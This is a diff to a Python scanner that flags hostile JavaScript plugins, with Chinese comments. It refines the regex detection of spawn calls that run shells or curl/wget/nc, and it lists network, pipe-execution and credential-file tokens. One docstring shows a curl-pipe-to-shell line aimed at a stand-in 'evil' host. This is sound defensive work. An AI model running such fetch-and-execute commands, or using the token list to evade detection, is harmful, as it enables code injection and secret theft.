@@ -21,7 +21,7 @@ SERVER_INJECT = {"tools", "settings", "llm"}
 CLIENT_INJECT = {"settingsScope", "slots", "locale", "agent", "storage",
                  "connection", "conversation", "modelSelection", "ui"}
 OSV_URL = "https://api.osv.dev/v1/query"
-__version__ = "0.1.4"
+__version__ = "0.1.5"
 
 # ─────────────────────────── 包名解析 ───────────────────────────
 def parse_pkg(s):
@@ -410,12 +410,20 @@ HOSTILE_HIGH = {
     # 泛 process.env 一律不报(README 已把"泛 process.env"列为良性)。
     "secret_read":   [r"process\.env\.[A-Za-z0-9_]*?(?:API_?KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL|ACCESS_KEY)[A-Za-z0-9_]*|toJSON\(secrets\)|credentials\.ya?ml|auth\.json"],
 }
-# spawn/execFile 绝大多数形态不报(数组传参、起子进程是插件常态),但下面两种语义无歧义:
-#   ① shell 宿主 —— spawn('bash', ['-c', …]) :数组传递**不等于**不经 shell
-#   ② 外传工具 —— spawn('curl', ['-d', secret, url]) :不经 shell **不等于**不危险
-# 这两组是 REPORT7 用探针实测出的漏洞(v1/v2/v3 此前全部漏报),又不会把误报率推回去。
-HOSTILE_SPAWN_HOST = [r"\b(?:spawn|spawnSync|execFile)\s*\(\s*['\"](?:[^'\"]*[\\/])?(?:sh|bash|zsh|cmd(?:\.exe)?|powershell|pwsh)['\"]"]
-HOSTILE_SPAWN_EXFIL = [r"\b(?:spawn|spawnSync|execFile)\s*\(\s*['\"](?:[^'\"]*[\\/])?(?:curl|wget|ncat|nc)['\"]"]
+# spawn/execFile 绝大多数形态不报(数组传参、起子进程是插件常态)。只有两类需要报,
+# 且两类都必须"程序名 + 上下文"一起看,单看程序名会误报:
+#   ① 调外传工具 —— spawn('curl', …) / ('curl.exe', …) :程序名本身就是动作,直接报
+#   ② 调 shell 本体 —— 光看程序名不行:Windows 插件用 powershell 查进程信息(Get-Process)
+#      是常见良性写法(实测:11 个真实插件因此多出 1 条误报)。改为要求"参数里出现联网 /
+#      管道执行 token"才报 —— 这样 spawn('bash',['-c','curl … | sh']) 仍报,纯本地查询不报。
+HOSTILE_SPAWN_EXFIL = [r"\b(?:spawn|spawnSync|execFile)\s*\(\s*['\"](?:[^'\"]*[\\/])?(?:curl|wget|ncat|nc)(?:\.exe)?\s*['\"]"]
+_SPAWN_SHELL_HOST = r"\b(?:spawn|spawnSync|execFile)\s*\(\s*['\"](?:[^'\"]*[\\/])?(?:sh|bash|zsh|cmd(?:\.exe)?|powershell|pwsh)(?:\.exe)?\s*['\"]"
+# 只收"动作类"证据:裸 https?:// 的证据强度太弱(URL 常出现在日志/帮助文本/常量里),
+# 用它会误报 —— 实测 spawn('bash', ['-c', 'echo 文档见 http://docs.example']) 被判为联网。
+# 每个名字都带前导 \b:少了它 "spawnSync(" 里的 "Sync" 会被 "nc\b" 咬到(工具名也出现在调用表达式里)。
+_SHELL_ARGV_DANGER = (r"(?:\bcurl\b|\bwget\b|\bncat\b|\bnc\b|/dev/tcp|\|\s*(?:sh|bash)\b|\biex\b|"
+                      r"Invoke-Expression|Invoke-WebRequest|Invoke-RestMethod|\biwr\b|DownloadString|DownloadFile|"
+                      r"base64\s+-d|certutil\s+-urlcache)")
 HOSTILE_NET = [r"require\(['\"](?:http|https|net|dgram|tls)['\"]\)|/dev/tcp/|\bcurl\s+|\bfetch\(|WebClient|DownloadString"]
 HOSTILE_PERSIST = [r"cron\.schedule|\bRun Copilot\b|schtasks|/etc/cron|Registry\\\\.*Run"]
 
@@ -519,6 +527,46 @@ def _cp_import_line(src, names):
     return None
 
 
+def _call_args(src, start):
+    """取从 start 处那次调用的完整参数区间(按括号配对),而不是"往后 N 个字符"。
+
+    为什么不能用固定字符窗口:那是"邻近性",不是"归属" —— 实测良性探针后面 90 字符处
+    另一条语句里的 fetch 会被算进它的上下文(误报),而蓄意在参数内填 900 个字符又能把
+    危险 token 推出窗口(绕过)。按括号配对取真正的参数区间,才是结构性归属的廉价近似。
+    """
+    i = src.find("(", start)
+    if i < 0:
+        return ""
+    depth = 0
+    end = min(len(src), i + 20000)
+    for j in range(i, end):
+        c = src[j]
+        if c in "([{":
+            depth += 1
+        elif c in ")]}":
+            depth -= 1
+            if depth == 0:
+                return src[i:j + 1]
+    return src[i:end]
+
+
+def _shell_host_argv_line(src):
+    """spawn/execFile 调 shell 本体、且参数里出现联网/管道执行 token 时的行号。
+
+    为什么不单看程序名:Windows 上插件用 powershell/cmd 做本地查询是常见写法,一律报就是误报
+    (实测 11 个真实插件因此多出 1 条)。加上"参数里有没有危险 token"这个条件后:
+      spawn('bash', ['-c', 'curl http://evil/x|sh'])      → 报
+      spawnSync('powershell', ['-Command', 'Get-Process …']) → 不报
+    已知边界:无网络的纯破坏性命令(rm -rf 之类)不会被这条抓到 —— 与本工具"主打外传/窃密/投毒"
+    的既有取向一致。
+    """
+    NL = chr(10)
+    for m in _re.finditer(_SPAWN_SHELL_HOST, src, _re.I):
+        if _re.search(_SHELL_ARGV_DANGER, _call_args(src, m.start()), _re.I):
+            return src.count(NL, 0, m.start()) + 1
+    return None
+
+
 def _shell_command_has_net(src):
     """exec('curl …') 这类:命令字符串是"真会执行的东西",不算噪音。
 
@@ -531,14 +579,15 @@ def _shell_command_has_net(src):
     return False
 
 
-def _hit_line(src, pats):
+def _hit_line(src, pats, ignore_case=False):
     """第一条命中的行号(1-based),没命中返回 None。
 
     告警必须带行号+可自查的位置:否则用户只看到一个文件名,无法判断真伪,
     自然就学会了无视告警。
     """
+    flags = _re.I if ignore_case else 0
     for pat in pats:
-        m = _re.search(pat, src)
+        m = _re.search(pat, src, flags)
         if m:
             return src.count(chr(10), 0, m.start()) + 1
     return None
@@ -612,10 +661,10 @@ def _hostile_scan(path):
         if has_net and ln_shell:
             hits.append(("warn", f"shell+网络(疑似外传;shell 在第 {ln_shell} 行)", f))
         # spawn 的两种无歧义形态(shell 宿主 / 调外传工具)——字符串里,所以在 code_s 上判
-        ln_host = _hit_line(code_s, HOSTILE_SPAWN_HOST)
+        ln_host = _shell_host_argv_line(code_s)
         if ln_host:
-            hits.append(("warn", f"高危单信号:shell 执行(spawn 调 shell 本体;第 {ln_host} 行)", f))
-        ln_exfil = _hit_line(code_s, HOSTILE_SPAWN_EXFIL)
+            hits.append(("warn", f"高危单信号:shell 执行(spawn 调 shell 本体 + 参数含联网/管道执行;第 {ln_host} 行)", f))
+        ln_exfil = _hit_line(code_s, HOSTILE_SPAWN_EXFIL, ignore_case=True)
         if ln_exfil:
             hits.append(("warn", f"高危单信号:外传工具(spawn 调 curl/wget 等;第 {ln_exfil} 行)", f))
         ln = _hit_line(code, HOSTILE_PERSIST)
